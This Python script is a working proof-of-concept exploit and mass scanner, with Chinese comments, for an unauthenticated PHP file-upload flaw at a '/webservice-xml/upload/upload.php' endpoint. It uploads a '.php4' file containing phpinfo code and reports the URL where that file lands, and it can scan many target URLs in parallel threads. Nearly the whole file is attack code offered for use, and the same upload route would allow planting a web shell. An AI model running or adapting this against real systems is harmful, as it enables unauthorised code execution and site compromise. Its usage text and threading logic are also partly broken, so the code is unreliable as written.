import requests
from optparse import OptionParser
from queue import Queue
from threading import Thread

# 存储结果的队列
result_queue = Queue()

# 请求头
headers={
    'Content-Type':'multipart/form-data; boundary=---------------------------10267625012906',
    'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36'
}

#代理
proxies = {
    'http':'http://127.0.0.1:8080'
}

#参数列表
def get_args():
    usage='%prog -n <username> -p <password> -u <url> -c <command>'
    parser=OptionParser(usage=usage)
    parser.add_option('-u','--url',dest='url',help='指定目标url')
    parser.add_option('-f','--file',dest='file',help='指定URL文件')
    parser.add_option('-t','--thread',dest='thread',help='指定线程数,默认50')
    options,args=parser.parse_args()
    return options

#poc
def poc(target):
    requests.packages.urllib3.disable_warnings()
    target=target.strip('/')
    target1= target
    target=target+'/webservice-xml/upload/upload.php'
    session=requests.Session()
    post_data='''-----------------------------10267625012906
Content-Disposition: form-data; name="file"; filename="1.php4"
Content-Type: application/octet-stream

test<?php phpinfo();?>
-----------------------------10267625012906--'''
    try:
        res=session.post(target,data=post_data,headers=headers,verify=False,proxies=proxies,timeout=3)
        if res.status_code == 200 and 'php' in res.text:
            vul = target1+'/attachment/'+res.text.replace('*','/')
            result_queue.put((vul,"存在漏洞！"))
        else:
            pass
    except:
        pass

# 创建线程池，启动线程并等待线程结束
def create_threads(urls,num_threads):
    threads = [Thread(target=poc, args=(url,)) for url in urls]
    for i in range(num_threads):
        threads[i % len(threads)].start()
    for j in range(num_threads):
        threads[j % len(threads)].join()

def main():
    args=get_args()
    url=args.url
    file_path=args.file
    num_threads = 50
    if args.thread:
        num_threads = int(args.thread)
    if url is not None and file_path is None:
        poc(url)
    elif url is None and file_path is not None:
        urls = [x.strip() for x in open(file_path, "r").readlines()]
        create_threads(urls,num_threads)
    while not result_queue.empty():
        url, status_code = result_queue.get()
        print('{} - {}'.format(url, status_code))

if __name__=='__main__':
    main()
